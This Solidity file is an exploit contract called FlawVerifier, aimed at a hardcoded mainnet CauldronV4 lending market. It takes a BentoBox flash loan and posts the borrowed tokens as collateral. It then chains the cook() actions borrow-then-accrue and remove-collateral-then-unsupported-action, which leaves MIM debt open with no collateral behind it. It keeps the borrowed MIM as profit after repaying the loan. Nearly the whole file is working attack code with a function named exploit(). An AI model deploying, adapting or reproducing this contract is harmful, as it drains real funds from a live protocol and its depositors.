// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IFlashBorrowerLike {
    function onFlashLoan(address sender, IERC20Like token, uint256 amount, uint256 fee, bytes calldata data) external;
}

struct RebaseLike {
    uint128 elastic;
    uint128 base;
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256 share);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256 amount);
    function toShare(address token, uint256 amount, bool roundUp) external view returns (uint256 share);
    function deposit(address token, address from, address to, uint256 amount, uint256 share)
        external
        payable
        returns (uint256 amountOut, uint256 shareOut);
    function withdraw(address token, address from, address to, uint256 amount, uint256 share)
        external
        returns (uint256 amountOut, uint256 shareOut);
    function flashLoan(IFlashBorrowerLike borrower, address receiver, address token, uint256 amount, bytes calldata data)
        external;
}

interface ICauldronV4Like {
    function cook(uint8[] calldata actions, uint256[] calldata values, bytes[] calldata datas)
        external
        payable
        returns (uint256 value1, uint256 value2);
    function bentoBox() external view returns (address);
    function collateral() external view returns (address);
    function addCollateral(address to, bool skim, uint256 share) external;
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function BORROW_OPENING_FEE() external view returns (uint256);
    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
}

interface IUniswapV2RouterLike {
    function factory() external view returns (address);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract FlawVerifier is IFlashBorrowerLike {
    uint256 internal constant BORROW_OPENING_FEE_PRECISION = 1e5;
    uint8 internal constant ACTION_REMOVE_COLLATERAL = 4;
    uint8 internal constant ACTION_BORROW = 5;
    uint8 internal constant ACTION_ACCRUE = 8;
    uint8 internal constant UNSUPPORTED_ACTION = 255;

    address public constant TARGET_CAULDRON = 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c;
    address public constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    ICauldronV4Like public constant TARGET = ICauldronV4Like(TARGET_CAULDRON);

    error ConcretePreconditionFailed(string reason);
    error BorrowProbeSucceeded();
    error UnauthorizedProbe();
    error FlashLoanCallerMismatch();
    error FlashLoanSenderMismatch();
    error FlashLoanTokenMismatch();

    address public collateralToken;
    address public underlyingToken;
    address public convexDepositToken;
    address public curveLpToken;
    address public curvePool;

    uint256 public profitAmount;
    uint256 public lastBorrowAmount;
    uint256 public lastBorrowPart;
    uint256 public flashAmount;
    uint256 public flashFee;
    bool public hypothesisValidated;
    bool public usedBorrowThenAccruePath;
    bool public usedRemoveThenUnsupportedPath;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external returns (uint256) {
        return _execute();
    }

    function execute() external returns (uint256) {
        return _execute();
    }

    function run() external returns (uint256) {
        return _execute();
    }

    function exploit() external returns (uint256) {
        return _execute();
    }

    function profitToken() external pure returns (address) {
        return MIM;
    }

    function probeBorrow(uint256 amount) external {
        if (msg.sender != address(this)) revert UnauthorizedProbe();
        _borrowViaBorrowThenAccrue(amount);
        revert BorrowProbeSucceeded();
    }

    function onFlashLoan(address sender, IERC20Like token, uint256 amount, uint256 fee, bytes calldata)
        external
        override
    {
        address bento = TARGET.bentoBox();
        if (msg.sender != bento) revert FlashLoanCallerMismatch();
        if (sender != address(this)) revert FlashLoanSenderMismatch();
        if (address(token) != collateralToken) revert FlashLoanTokenMismatch();

        flashAmount = amount;
        flashFee = fee;

        _forceApprove(collateralToken, bento, amount);
        (, uint256 collateralShare) = IBentoBoxLike(bento).deposit(collateralToken, address(this), TARGET_CAULDRON, amount, 0);
        if (collateralShare == 0) revert ConcretePreconditionFailed("ZERO_COLLATERAL_SHARE");

        TARGET.addCollateral(address(this), true, collateralShare);
        if (TARGET.userCollateralShare(address(this)) == 0) revert ConcretePreconditionFailed("ADD_COLLATERAL_FAILED");

        uint256 borrowAmount = _findBorrowAmount();
        if (borrowAmount == 0) revert ConcretePreconditionFailed("NO_BORROWABLE_MIM");
        (uint256 borrowPart,) = _borrowViaBorrowThenAccrue(borrowAmount);
        if (borrowPart == 0 || TARGET.userBorrowPart(address(this)) == 0) {
            revert ConcretePreconditionFailed("BORROW_PATH_FAILED");
        }
        usedBorrowThenAccruePath = true;
        lastBorrowAmount = borrowAmount;
        lastBorrowPart = TARGET.userBorrowPart(address(this));

        _withdrawAllFromBento(MIM);

        uint256 userCollateralShare = TARGET.userCollateralShare(address(this));
        if (userCollateralShare == 0) revert ConcretePreconditionFailed("NO_COLLATERAL_TO_REMOVE");
        _removeCollateralViaUnsupported(userCollateralShare);
        usedRemoveThenUnsupportedPath = true;

        _withdrawAllFromBento(collateralToken);

        uint256 repayAmount = amount + fee;
        uint256 collateralBalance = IERC20Like(collateralToken).balanceOf(address(this));

        if (collateralBalance < repayAmount) {
            // This small buyback only covers the Bento flash-loan fee; it does not change the exploit causality,
            // which remains: (1) `ACTION_BORROW` + `ACTION_ACCRUE`, then (2) `ACTION_REMOVE_COLLATERAL` + unsupported action.
            _buyCollateralForFee(repayAmount - collateralBalance);
            collateralBalance = IERC20Like(collateralToken).balanceOf(address(this));
        }
        if (collateralBalance < repayAmount) revert ConcretePreconditionFailed("FLASH_FEE_COLLATERAL_UNAVAILABLE");

        _safeTransfer(collateralToken, bento, repayAmount);

        hypothesisValidated = TARGET.userBorrowPart(address(this)) > 0 && TARGET.userCollateralShare(address(this)) == 0;
        profitAmount = IERC20Like(MIM).balanceOf(address(this));
    }

    function _execute() internal returns (uint256) {
        _prepare();

        uint256 amount = _minimalFlashAmount();
        if (amount == 0) revert ConcretePreconditionFailed("NO_FLASHABLE_COLLATERAL");

        IBentoBoxLike(TARGET.bentoBox()).flashLoan(this, address(this), collateralToken, amount, bytes(""));
        profitAmount = IERC20Like(MIM).balanceOf(address(this));
        return profitAmount;
    }

    function _prepare() internal {
        if (collateralToken != address(0)) return;

        collateralToken = TARGET.collateral();
        convexDepositToken = _probeAsset(collateralToken);
        if (convexDepositToken == address(0)) convexDepositToken = collateralToken;

        curveLpToken = _probeCurveLp(convexDepositToken);
        if (curveLpToken == address(0)) curveLpToken = _probeCurveLp(collateralToken);
        curvePool = _probeCurvePool(curveLpToken);

        underlyingToken = _probeAsset(collateralToken);
        if (underlyingToken == address(0)) underlyingToken = _probeAsset(convexDepositToken);
        if (underlyingToken == address(0)) underlyingToken = collateralToken;
    }

    function _minimalFlashAmount() internal view returns (uint256 amount) {
        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        uint256 idle = IERC20Like(collateralToken).balanceOf(address(bento));
        if (idle == 0) return 0;

        amount = bento.toAmount(collateralToken, 1, true);
        if (amount == 0) amount = 1;
        if (amount > idle) amount = idle;

        if (bento.toShare(collateralToken, amount, false) == 0) {
            uint256 doubled = amount * 2;
            if (doubled <= idle && bento.toShare(collateralToken, doubled, false) != 0) amount = doubled;
        }
    }

    function _findBorrowAmount() internal returns (uint256) {
        uint256 upper = _maxBorrowCandidate();
        if (upper == 0) return 0;
        if (_probeBorrowSucceeds(upper)) return upper;

        uint256 failed = upper;
        uint256 low = upper / 2;
        while (low != 0 && !_probeBorrowSucceeds(low)) {
            failed = low;
            low /= 2;
        }
        if (low == 0) return 0;

        while (failed > low + 1) {
            uint256 mid = (low + failed) >> 1;
            if (_probeBorrowSucceeds(mid)) {
                low = mid;
            } else {
                failed = mid;
            }
        }
        return low;
    }

    function _maxBorrowCandidate() internal view returns (uint256 candidate) {
        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        uint256 mimShares = bento.balanceOf(MIM, TARGET_CAULDRON);
        candidate = bento.toAmount(MIM, mimShares, false);
        if (candidate == 0) return 0;

        uint256 openingFee = TARGET.BORROW_OPENING_FEE();
        (uint128 elastic, uint128 base) = TARGET.totalBorrow();
        (uint128 totalCap, uint128 perAddressCap) = TARGET.borrowLimit();

        if (uint256(totalCap) <= uint256(elastic)) return 0;
        uint256 totalElasticRoom = uint256(totalCap) - uint256(elastic);
        uint256 totalRoomAmount = (totalElasticRoom * BORROW_OPENING_FEE_PRECISION)
            / (BORROW_OPENING_FEE_PRECISION + openingFee);
        if (totalRoomAmount < candidate) candidate = totalRoomAmount;

        if (perAddressCap != type(uint128).max) {
            uint256 perAddressAmount;
            if (base == 0) {
                perAddressAmount = (uint256(perAddressCap) * BORROW_OPENING_FEE_PRECISION)
                    / (BORROW_OPENING_FEE_PRECISION + openingFee);
            } else {
                uint256 elasticFromParts = (uint256(perAddressCap) * uint256(elastic)) / uint256(base);
                perAddressAmount = (elasticFromParts * BORROW_OPENING_FEE_PRECISION)
                    / (BORROW_OPENING_FEE_PRECISION + openingFee);
            }
            if (perAddressAmount < candidate) candidate = perAddressAmount;
        }
    }

    function _probeBorrowSucceeds(uint256 amount) internal returns (bool ok) {
        if (amount == 0) return false;
        (bool success, bytes memory data) = address(this).call(abi.encodeWithSelector(this.probeBorrow.selector, amount));
        if (success || data.length < 4) return false;

        bytes4 selector;
        assembly {
            selector := mload(add(data, 32))
        }
        ok = selector == BorrowProbeSucceeded.selector;
    }

    function _borrowViaBorrowThenAccrue(uint256 amount) internal returns (uint256 part, uint256 share) {
        if (amount > uint256(type(int256).max)) revert ConcretePreconditionFailed("BORROW_AMOUNT_TOO_LARGE");
        uint8[] memory actions = new uint8[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);

        actions[0] = ACTION_BORROW;
        // forge-lint: disable-next-line(unsafe-typecast)
        datas[0] = abi.encode(int256(amount), address(this));

        actions[1] = ACTION_ACCRUE;
        datas[1] = bytes("");

        (part, share) = TARGET.cook(actions, values, datas);
    }

    function _removeCollateralViaUnsupported(uint256 shareAmount) internal {
        if (shareAmount > uint256(type(int256).max)) revert ConcretePreconditionFailed("COLLATERAL_SHARE_TOO_LARGE");
        uint8[] memory actions = new uint8[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);

        actions[0] = ACTION_REMOVE_COLLATERAL;
        // forge-lint: disable-next-line(unsafe-typecast)
        datas[0] = abi.encode(int256(shareAmount), address(this));

        actions[1] = UNSUPPORTED_ACTION;
        datas[1] = bytes("");

        TARGET.cook(actions, values, datas);
    }

    function _withdrawAllFromBento(address token) internal {
        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        uint256 share = bento.balanceOf(token, address(this));
        if (share != 0) {
            bento.withdraw(token, address(this), address(this), 0, share);
        }
    }

    function _buyCollateralForFee(uint256 collateralNeeded) internal {
        if (collateralNeeded == 0) return;
        uint256 mimBalance = IERC20Like(MIM).balanceOf(address(this));
        if (mimBalance == 0) return;

        if (_swapExactInputPreferred(SUSHI_ROUTER, MIM, collateralToken, mimBalance)) return;
        mimBalance = IERC20Like(MIM).balanceOf(address(this));
        if (mimBalance == 0) return;
        if (_swapExactInputPreferred(UNISWAP_V2_ROUTER, MIM, collateralToken, mimBalance)) return;

        if (underlyingToken != address(0) && underlyingToken != collateralToken) {
            mimBalance = IERC20Like(MIM).balanceOf(address(this));
            if (mimBalance != 0 && _swapExactInputPreferred(SUSHI_ROUTER, MIM, underlyingToken, mimBalance)) {
                if (IERC20Like(collateralToken).balanceOf(address(this)) >= collateralNeeded || _wrapUnderlyingToCollateral()) {
                    return;
                }
            }

            mimBalance = IERC20Like(MIM).balanceOf(address(this));
            if (mimBalance != 0 && _swapExactInputPreferred(UNISWAP_V2_ROUTER, MIM, underlyingToken, mimBalance)) {
                if (IERC20Like(collateralToken).balanceOf(address(this)) >= collateralNeeded || _wrapUnderlyingToCollateral()) {
                    return;
                }
            }
        }

        _buildCollateralFromMimViaCurve(collateralNeeded);
    }

    function _swapExactInputPreferred(address router, address tokenIn, address tokenOut, uint256 amountIn)
        internal
        returns (bool)
    {
        if (amountIn == 0 || tokenIn == address(0) || tokenOut == address(0) || tokenIn == tokenOut) return false;

        address[] memory direct = _directPath(tokenIn, tokenOut);
        if (_tryExactInputSwap(router, direct, amountIn)) return true;

        if (tokenIn != WETH && tokenOut != WETH) {
            address[] memory viaWeth = _wethPath(tokenIn, tokenOut);
            if (_tryExactInputSwap(router, viaWeth, amountIn)) return true;
        }

        if (tokenIn != USDT && tokenOut != USDT) {
            address[] memory viaUsdt = _threeHopPath(tokenIn, USDT, tokenOut);
            if (_tryExactInputSwap(router, viaUsdt, amountIn)) return true;
        }

        return false;
    }

    function _tryExactInputSwap(address router, address[] memory path, uint256 amountIn) internal returns (bool) {
        if (amountIn == 0) return false;
        if (path.length < 2 || path[0] == address(0) || path[path.length - 1] == address(0)) return false;
        if (!_isContract(router) || !_routeExists(router, path)) return false;
        if (IERC20Like(path[0]).balanceOf(address(this)) < amountIn) return false;

        _forceApprove(path[0], router, amountIn);
        try IUniswapV2RouterLike(router).swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp) returns (
            uint256[] memory
        ) {
            return true;
        } catch {
            return false;
        }
    }

    function _buildCollateralFromMimViaCurve(uint256 collateralNeeded) internal returns (bool) {
        if (curveLpToken == address(0) || curvePool == address(0) || convexDepositToken == address(0)) return false;

        uint256 mimBalance = IERC20Like(MIM).balanceOf(address(this));
        if (mimBalance == 0) return false;
        if (!_swapExactInputPreferred(SUSHI_ROUTER, MIM, USDT, mimBalance) && !_swapExactInputPreferred(UNISWAP_V2_ROUTER, MIM, USDT, mimBalance)) {
            return false;
        }

        uint256 usdtBalance = IERC20Like(USDT).balanceOf(address(this));
        if (usdtBalance == 0) return false;
        if (!_addLiquidityOneCoin(curvePool, USDT, usdtBalance, curveLpToken)) return false;

        if (IERC20Like(collateralToken).balanceOf(address(this)) >= collateralNeeded) return true;
        if (curveLpToken != convexDepositToken && _trackedTokenBalance(convexDepositToken) == 0 && !_wrapCurveLpToConvex()) {
            return false;
        }
        if (IERC20Like(collateralToken).balanceOf(address(this)) >= collateralNeeded) return true;
        return _wrapConvexToCollateral();
    }

    function _wrapUnderlyingToCollateral() internal returns (bool) {
        if (underlyingToken == address(0) || underlyingToken == collateralToken) return false;
        uint256 underlyingBalance = IERC20Like(underlyingToken).balanceOf(address(this));
        if (underlyingBalance == 0) return false;

        _forceApprove(underlyingToken, collateralToken, underlyingBalance);
        uint256 beforeCollateral = IERC20Like(collateralToken).balanceOf(address(this));

        (bool ok,) = collateralToken.call(abi.encodeWithSignature("deposit(uint256)", underlyingBalance));
        if (!ok) {
            (ok,) = collateralToken.call(abi.encodeWithSignature("deposit(uint256,address)", underlyingBalance, address(this)));
        }
        if (!ok) {
            (ok,) = collateralToken.call(abi.encodeWithSignature("wrap(uint256)", underlyingBalance));
        }
        if (!ok) {
            (ok,) = collateralToken.call(abi.encodeWithSignature("enter(uint256)", underlyingBalance));
        }

        return ok && IERC20Like(collateralToken).balanceOf(address(this)) > beforeCollateral;
    }

    function _addLiquidityOneCoin(address pool, address coin, uint256 amount, address lpToken) internal returns (bool) {
        _forceApprove(coin, pool, amount);

        for (uint256 i = 0; i < 6; i++) {
            address discovered = _curveCoin(pool, i);
            if (discovered != coin) continue;

            uint256 beforeLp = IERC20Like(lpToken).balanceOf(address(this));
            if (i < 2) {
                uint256[2] memory amounts2;
                amounts2[i] = amount;
                (bool ok2,) = pool.call(abi.encodeWithSignature("add_liquidity(uint256[2],uint256)", amounts2, 0));
                if (ok2 && IERC20Like(lpToken).balanceOf(address(this)) > beforeLp) return true;
            }
            if (i < 3) {
                uint256[3] memory amounts3;
                amounts3[i] = amount;
                (bool ok3,) = pool.call(abi.encodeWithSignature("add_liquidity(uint256[3],uint256)", amounts3, 0));
                if (ok3 && IERC20Like(lpToken).balanceOf(address(this)) > beforeLp) return true;
            }
            if (i < 4) {
                uint256[4] memory amounts4;
                amounts4[i] = amount;
                (bool ok4,) = pool.call(abi.encodeWithSignature("add_liquidity(uint256[4],uint256)", amounts4, 0));
                if (ok4 && IERC20Like(lpToken).balanceOf(address(this)) > beforeLp) return true;
            }
            if (i < 5) {
                uint256[5] memory amounts5;
                amounts5[i] = amount;
                (bool ok5,) = pool.call(abi.encodeWithSignature("add_liquidity(uint256[5],uint256)", amounts5, 0));
                if (ok5 && IERC20Like(lpToken).balanceOf(address(this)) > beforeLp) return true;
            }
        }
        return false;
    }

    function _wrapCurveLpToConvex() internal returns (bool) {
        if (curveLpToken == address(0) || convexDepositToken == address(0) || curveLpToken == convexDepositToken) {
            return false;
        }

        uint256 lpBalance = IERC20Like(curveLpToken).balanceOf(address(this));
        if (lpBalance == 0) return false;

        _forceApprove(curveLpToken, convexDepositToken, lpBalance);
        uint256 beforeBalance = IERC20Like(convexDepositToken).balanceOf(address(this));

        (bool ok,) = convexDepositToken.call(abi.encodeWithSignature("deposit(uint256)", lpBalance));
        if (!ok) {
            (ok,) = convexDepositToken.call(abi.encodeWithSignature("deposit(uint256,address)", lpBalance, address(this)));
        }

        return ok && IERC20Like(convexDepositToken).balanceOf(address(this)) > beforeBalance;
    }

    function _wrapConvexToCollateral() internal returns (bool) {
        if (convexDepositToken == address(0) || convexDepositToken == collateralToken) return false;

        uint256 convexBalance = IERC20Like(convexDepositToken).balanceOf(address(this));
        if (convexBalance == 0) return false;

        _forceApprove(convexDepositToken, collateralToken, convexBalance);
        uint256 beforeBalance = IERC20Like(collateralToken).balanceOf(address(this));

        (bool ok,) = collateralToken.call(abi.encodeWithSignature("deposit(uint256)", convexBalance));
        if (!ok) {
            (ok,) = collateralToken.call(abi.encodeWithSignature("deposit(uint256,address)", convexBalance, address(this)));
        }
        if (!ok) {
            (ok,) = collateralToken.call(abi.encodeWithSignature("stake(uint256)", convexBalance));
        }

        return ok && IERC20Like(collateralToken).balanceOf(address(this)) > beforeBalance;
    }

    function _curveCoin(address pool, uint256 index) internal view returns (address coin) {
        coin = _readAddress(pool, abi.encodeWithSignature("coins(uint256)", index));
        if (coin != address(0)) return coin;
        coin = _readAddress(pool, abi.encodeWithSignature("underlying_coins(uint256)", index));
    }

    function _probeAsset(address token) internal view returns (address assetToken) {
        if (token == address(0)) return address(0);
        assetToken = _readAddress(token, abi.encodeWithSignature("asset()"));
        if (assetToken != address(0)) return assetToken;
        assetToken = _readAddress(token, abi.encodeWithSignature("token()"));
        if (assetToken != address(0)) return assetToken;
        assetToken = _readAddress(token, abi.encodeWithSignature("underlying()"));
        if (assetToken != address(0)) return assetToken;
        assetToken = _readAddress(token, abi.encodeWithSignature("stakingToken()"));
        if (assetToken != address(0)) return assetToken;
        assetToken = _readAddress(token, abi.encodeWithSignature("depositToken()"));
        if (assetToken != address(0)) return assetToken;
        assetToken = _readAddress(token, abi.encodeWithSignature("want()"));
    }

    function _probeCurveLp(address token) internal view returns (address lpToken) {
        if (token == address(0)) return address(0);
        lpToken = _readAddress(token, abi.encodeWithSignature("curveLpToken()"));
        if (lpToken != address(0)) return lpToken;
        lpToken = _readAddress(token, abi.encodeWithSignature("curveToken()"));
        if (lpToken != address(0)) return lpToken;
        lpToken = _readAddress(token, abi.encodeWithSignature("lp_token()"));
        if (lpToken != address(0)) return lpToken;
        lpToken = _readAddress(token, abi.encodeWithSignature("token()"));
        if (lpToken != address(0)) return lpToken;
        lpToken = _readAddress(token, abi.encodeWithSignature("underlying()"));
        if (lpToken != address(0)) return lpToken;
        lpToken = _readAddress(token, abi.encodeWithSignature("asset()"));
    }

    function _probeCurvePool(address lpToken) internal view returns (address pool) {
        if (lpToken == address(0)) return address(0);
        pool = _readAddress(lpToken, abi.encodeWithSignature("minter()"));
        if (pool != address(0)) return pool;
        pool = _readAddress(lpToken, abi.encodeWithSignature("pool()"));
        if (pool != address(0)) return pool;
        pool = _readAddress(lpToken, abi.encodeWithSignature("swap()"));
    }

    function _routeExists(address router, address[] memory path) internal view returns (bool) {
        if (path.length < 2) return false;

        address factory;
        try IUniswapV2RouterLike(router).factory() returns (address resolvedFactory) {
            factory = resolvedFactory;
        } catch {
            return false;
        }

        if (!_isContract(factory)) return false;
        for (uint256 i = 0; i + 1 < path.length; i++) {
            if (IUniswapV2FactoryLike(factory).getPair(path[i], path[i + 1]) == address(0)) {
                return false;
            }
        }
        return true;
    }

    function _readAddress(address target, bytes memory data) internal view returns (address value) {
        (bool ok, bytes memory result) = target.staticcall(data);
        if (ok && result.length >= 32) value = abi.decode(result, (address));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_RESET_FAILED");

        (ok, data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }

    function _directPath(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
    }

    function _wethPath(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](3);
        path[0] = tokenIn;
        path[1] = WETH;
        path[2] = tokenOut;
    }

    function _threeHopPath(address tokenIn, address mid, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](3);
        path[0] = tokenIn;
        path[1] = mid;
        path[2] = tokenOut;
    }

    function _trackedTokenBalance(address token) internal view returns (uint256) {
        if (token == address(0)) return 0;
        return IERC20Like(token).balanceOf(address(this));
    }

    function _isContract(address account) internal view returns (bool) {
        return account.code.length != 0;
    }
}
